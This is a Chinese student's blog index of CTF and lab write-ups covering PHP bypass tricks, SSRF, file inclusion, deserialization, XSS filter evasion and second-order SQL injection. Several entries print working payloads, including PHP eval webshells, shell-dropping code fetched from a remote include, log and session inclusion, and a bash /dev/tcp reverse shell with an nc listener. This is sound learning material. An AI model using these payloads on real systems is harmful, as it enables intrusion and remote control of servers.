<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hgame(php)]]></title>
    <url>%2F2019%2F02%2F14%2Fhgame-php%2F</url>
    <content type="text"><![CDATA[杭电vidar的hgame，其中几道php的题，写一下学到的。 php trick 十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~） #####（1）==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过 （2）===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见https://blog.csdn.net/qq_19980431/article/details/83018232） #####（3） php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里 #####（4） 数组绕过 #####（5）这里被难住了，ssrf类型，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过，parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，这样我们就可以用 http://@127.0.0.1:80@www.baidu.com/admin.php 来绕过,从而读取admin.php #####（6）这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits. #####（7）最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php php is the best language我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string参数algo：要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。data：要进行哈希运算的消息。key：使用 HMAC 生成信息摘要时所使用的密钥raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。 当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：https://www.k2zone.cn/?p=2019双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM之后可求gatephp&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6” 最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2019%2F02%2F07%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。咕~]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5碰撞]]></title>
    <url>%2F2019%2F01%2F30%2FMD5%E7%A2%B0%E6%92%9E%2F</url>
    <content type="text"><![CDATA[bugku MD5碰撞MD5碰撞的含义：让两个不同内容的字符串或者文件有相同的MD5值。之前遇到了数组的MD5碰撞，现在php里存在另一个MD5碰撞的漏洞。 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 MD5算法原理]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku(2)]]></title>
    <url>%2F2018%2F12%2F26%2FBugku-2%2F</url>
    <content type="text"><![CDATA[Web8/welcome to bugkuctfphp变量覆盖漏洞&lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo “This is flag:” .” $flag”;}else{echo”sorry!”;}}?&gt; 先说一下php函数extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 trim(string,charlist)string 必需。规定要检查的字符串。charlist可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：“\0” - NULL“\t” - 制表符“\n” - 换行“\x0B” - 垂直制表符“\r” - 回车“ “ - 空格 empty()和isset()PHP的isset()函数 一般用来检测变量是否设置 若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE PHP的empty()函数 判断值为否为空 若变量不存在则返回 TRUE若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE php封装协议php://input写入fn的值与a相同即可 php反序列化welcome to the bugkuctf中利用php封装协议读取index.php和hint.php的内容得到全部的源码，可知flag在flag.php里，但是需要绕过一步正则匹配的限制。 hint.php&lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo ““; return (“good”); } }}?&gt; index.php&lt;?php$txt = $_GET[“txt”];$file = $_GET[“file”];$password = $_GET[“password”]; if(isset($txt)&amp;&amp;(file_get_contents($txt,’r’)===”welcome to the bugkuctf”)){ echo “hello friend!“; if(preg_match(“/flag/“,$file)){ echo “不能现在就给你flag”; exit(); }else{ include($file); $password = unserialize($password); echo $password; }}else{ echo “you are not the number of bugku ! “;} ?&gt; 源码中可以看到如果没有匹配到flag的话就会引用file的文件，所以file=hint.php，password的值进行序列化构造，当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。unserialize()函数变量可控所以就可以构造payload使得hint.php的全局变量file为flag.phppassword=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}最终构造的payload为?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku]]></title>
    <url>%2F2018%2F12%2F21%2FBugku%2F</url>
    <content type="text"><![CDATA[Bugku补题 备份是个好习惯题目不难涉及到的php函数比较多，都是现查的，记一下开始备份提示，查看临时文件index.php~或者index.php.bakindex.php.bak中有源码 strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。&lt;?php echo strstr(“Helloworld!”,”world”);?&gt;输出：world! $_SERVER[‘REQUEST_URI’]http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333结果：$_SERVER[‘QUERY_STRING’]=”p=222&amp;q=333”;$_SERVER[‘REQUEST_URI’]=”/aaa/index.php?p=222&amp;q=333”;$_SERVER[‘SCRIPT_NAME’]=”/aaa/index.php”;$_SERVER[‘PHP_SELF’]=”/aaa/index.php”; 由实例可知：$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值$_SERVER[“REQUEST_URI”] 获取 http://localhost 后面的值，包括/$_SERVER[“SCRIPT_NAME”] 获取当前脚本的路径，如：index.php$ _SERVER[“PHP_SELF”] 当前正在执行脚本的文件名 substr(string,start,length)substr() 函数返回字符串的一部分。length不必需。echo substr(“Hello world”,6);输出第六个字符之后的输出：world str_replace(find,replace,string,count)find必需。规定要查找的值。replace必需。规定替换 find 中的值的值。string必需。规定被搜索的字符串。count可选。一个变量，对替换数进行计数。 echo str_replace(“world”,”John”,”Hello world!”); 将world替换为John输出：Hello John!该函数对大小写敏感。请使用 str_ireplace() 执行对大小写不敏感的搜索。 parse_str() 函数把查询字符串解析到变量中。parse_str(“name=Peter&amp;age=43”);echo $name;echo $age;输出：Peter 43 MD5碰撞题目代码的意思就是ip地址之后从？开始的值，然后变为第一位之后的值，删掉?。由echo语句可知变量中有key1和key2，但是$str中遇到key就替换为空，由于替换只执行一次，所以双写就可以绕过，之后MD5碰撞构造payload：http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。当 md5接受的数据为数组时就会返回null，两值相等。 strcmpstrcmp(str1,str2)如果str1小于str2返回-1，str1=str2返回0，str1&gt;str2返回1，if(！strcmp($a,$b)),要求a与b中值相等。strcmp()在比较字符串和数组的时候直接返回0a[]=1&amp;b[]=1 flag在index里文件包含漏洞(基础知识选自https://blog.csdn.net/qq_41007744/article/)PHP包含php中提供四个文件包含的函数，分别是include(),include_once(),require()和require_once()。 这四个都可以进行文件包含，但有区别 require找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本include找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行include_once:此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含 1.使用PHP封装协议file_get_contents内部可以使用php伪协议PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似。 file:// 访问本地文件系统http:// 访问HTTP(s)网址php:// 访问输入/输出流zlib:// 压缩流data:// 数据ssh2:// Secure Shell 2expect:// 处理交互式的流 glob:// 查找匹配的文件路径 使用封装协议读取PHP文件 使用PHP封装协议内置封装协议可以读取PHP文件。 (1)http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php 得到base64加密的php源码 (2)写入php文件 使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include(on)。 构造URL: http://www.xxser.com/index.php?page=php://input, 并且提交数据为: &lt;?php system (‘net user’);?&gt; 如果提交&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[‘xxser’]);?&gt;”)?&gt;将会在index.php所在目录下生成shell.php 2.包含截断当文件名会被强制添加时使用%00截断，php中不会显示%00后面的内容，这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义。 3. 远程包含Shell如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: http://www.2cto.com/echo.txt 代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval ($_POST[x]);?&gt;”)?&gt;访问: http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt, 将会在Index.php所在的目录下生成shell.php 4.本地包含配合文件上传很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为: /uploadfile/201363.jpg 图片代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[x]);?&gt;”)?&gt;访问URL: http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg, 包含这张图片，将会在Index.php所在的目录中生成shell.php 5.包含日志文件Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中 当访问一个不存在的资源时，Apache日志同样会记录 这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: http://www.xxser.com/&lt;?php phpinfo();?&gt;.Apache会记录请求”&lt;?php phpinfo();?&gt;” 并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞。 但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了 127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] “GET /%3C?php%20phpinfo();)?%3E HTTP/1.1” 403 291 PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞。 但可以通过Burp绕过编码 再利用accsee去包含accsee.log，即可成功执行其中的PHP代码 在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log 原文链接：https://blog.csdn.net/qq_41007744/article/ 6.包含session文件session中的内容可以被控制，传入恶意代码。session的存储位置可以获取。1.通过phpinfo的信息可以获取到session的存储位置。2.通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存 php一句话木马查看php的shell信息：&lt;?php phpinfo();exit;?&gt;eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;&lt;?php @eval($_POST[‘c’]);?&gt; NCTF Web题‘基本操作’复现登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;” 留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss跨站脚本攻击(1)]]></title>
    <url>%2F2018%2F12%2F01%2Fxss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-1%2F</url>
    <content type="text"><![CDATA[XSS (Reflected)用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码low难度没有任何过滤直接 alert(‘xss’)就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波， str_replace（）：定义和用法 str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是数组，那么它将返回数组。如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。 (1)大小写绕过&lt; sCript&gt;(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;（原文：https://blog.csdn.net/caoyouming0609/article/details/75208002） preg_replace（）：.： 匹配除“\n”之外的任何单个字符。*： 匹配前面的子表达式零次或多次。所以&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件&lt; img src=”1” onerror=alert(‘xss’)&gt; onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。 盗取cookie(咕~)]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑白盒]]></title>
    <url>%2F2018%2F11%2F29%2F%E9%BB%91%E7%99%BD%E7%9B%92%2F</url>
    <content type="text"><![CDATA[黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。 首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行； 2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似); 3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。 4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件: 1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。 2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。 3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。(来源：看雪) Getshell在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。 二次注入网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。 Into outfile导出数据到pc的指定目录下。在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方/var/www/html/一般为网站的根目录 注册&lt;?php $_GET[x];?&gt;&lt;?php $_GET[x];?&gt; PHP中反引号 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php $_GET[x];?&gt;写入数据库 注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php将&lt;?php $_GET[x];?&gt;从数据库中提取出来并导出到favicon/4.php此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了 bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。 linux shell下常用的文件描述符是： 标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。 &amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。 这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)之后再服务器开启监听 nc -lvnp 9999 现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp//9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令 原理A主机开启9999端口的tcp服务B主机连接到A主机的9999的tcp服务A主机通过tcp服务把命令发到B主机B主机读取命令并且在bash中执行B主机把执行结果发给A主机 拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件cat读取文件就可以拿到flag]]></content>
      <categories>
        <category>Web复现</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2018%2F11%2F19%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[同源策略最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略 首先是源的概念：• 源（origin）就是协议、域名和端口号。 以下是相对于 http://www.a.com/test/index.html 的同源检测• http://www.a.com/dir/page.html —-成功• http://www.child.a.com/test/index.html —-失败，域名不同• https://www.a.com/test/index.html —-失败，协议不同所以所谓同源就是协议、域名和端口号均相同。 什么是同源策略： 同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。 举个例子：如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。 什么是跨域浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域 不受同源策略限制的：1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。 第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客初建]]></title>
    <url>%2F2018%2F11%2F17%2F%E9%BB%91%E7%99%BD%E7%9B%92%2Fhello-world%2F</url>
    <content type="text"><![CDATA[从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。]]></content>
  </entry>
</search>
